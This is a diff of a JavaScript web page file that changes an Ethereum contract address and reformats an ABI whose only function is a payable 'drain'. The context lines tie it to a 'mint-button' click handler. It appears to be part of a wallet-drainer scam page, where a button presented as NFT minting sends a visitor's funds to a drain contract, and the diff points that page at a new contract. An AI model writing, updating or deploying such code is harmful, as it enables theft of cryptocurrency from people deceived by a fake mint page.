@@ -1,18 +1,18 @@
 // Set the contract address and ABI
-const contractAddress = '0xD0507daD8536c1fE14122B04009AFA9e9C7ae514';
+const contractAddress = '0x1db7c769c45F62593A07EEde5Fa58ab4Ffe98d62';
 const contractABI = [
-    {
-        "inputs": [],
-        "name": "drain",
-        "outputs": [],
-        "stateMutability": "payable",
-        "type": "function"
-    },
-    {
-        "inputs": [],
-        "stateMutability": "nonpayable",
-        "type": "constructor"
-    }
+	{
+		"inputs": [],
+		"name": "drain",
+		"outputs": [],
+		"stateMutability": "payable",
+		"type": "function"
+	},
+	{
+		"inputs": [],
+		"stateMutability": "nonpayable",
+		"type": "constructor"
+	}
 ];
 
 // Initialize Web3 and the contract
@@ -39,3 +39,4 @@ document.getElementById('mint-button').addEventListener('click', async function(
         alert('An error occurred, please try again.');
     }
 });
+
